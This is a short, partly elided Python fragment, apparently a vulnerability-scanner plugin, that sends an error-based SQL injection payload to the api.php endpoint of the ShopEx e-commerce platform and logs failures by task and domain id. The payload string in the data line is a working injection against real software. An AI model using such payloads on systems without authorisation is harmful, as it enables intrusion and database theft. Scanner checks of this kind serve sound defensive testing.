...
def run_domain(http,ob):
    ...
    try:
        ...
        expurl="%s%s"%(url,"api.php")
        data="act=search_sub_regions&api_version=1.0&return_data=string&p_region_id=22%20and%20(select%201%20from%20(select%20count(*),concat(md5(333),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23"
        ...
        logging.getLogger().error("File:Shopex_post_APISqlInjectionScript_v1.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
    #end try
